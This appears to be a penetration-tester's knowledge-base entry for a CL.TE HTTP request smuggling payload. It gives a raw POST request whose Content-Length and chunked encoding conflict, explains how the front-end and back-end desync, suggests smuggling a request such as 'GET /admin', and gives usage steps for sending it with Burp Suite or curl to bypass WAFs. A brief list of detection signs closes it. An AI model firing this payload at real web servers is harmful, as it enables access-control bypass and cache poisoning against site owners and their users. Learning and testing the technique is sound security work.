---
type: code
language: http
verified: true
platforms:
  - Web
tags:
  - http-smuggling
  - payload
  - cl-te
validated: true
---

# CL-TE-Smuggling-Payload-with-SMUGGLED

## Code

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## Description

This raw HTTP request payload exploits CL.TE by setting a short Content-Length (13 bytes) while using chunked encoding. The front-end proxy reads only up to Content-Length, interpreting the trailing "SMUGGLED" (and any following content) as a new request, which the backend processes separately. Ideal for injecting unauthorized requests in testing.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Host | Target domain | vulnerable-website.com |
| Content-Length | Mismatch value to desync front-end (body length before chunk end) | 13 |
| SMUGGLED | Payload for the smuggled request (e.g., another HTTP method or path) | SMUGGLED (replace with actual exploit like GET /admin) |

## Usage

Copy this into a tool like Burp Suite Repeater or curl with --data-binary to send. Use in procedures like [[procedures/HTTP-Request-Smuggling-via-CL-TE]] to bypass WAFs. Start with probing to confirm vulnerability before full exploitation.

## Detection

- WAF logs showing conflicting Content-Length and Transfer-Encoding headers.
- Anomalous request chaining in proxy logs (e.g., unexpected second requests).
- Backend errors from malformed chunked bodies or cache poisoning indicators.

## Related

- [[procedures/HTTP-Request-Smuggling-via-CL-TE]]
- [[tools/Burp-Suite]]
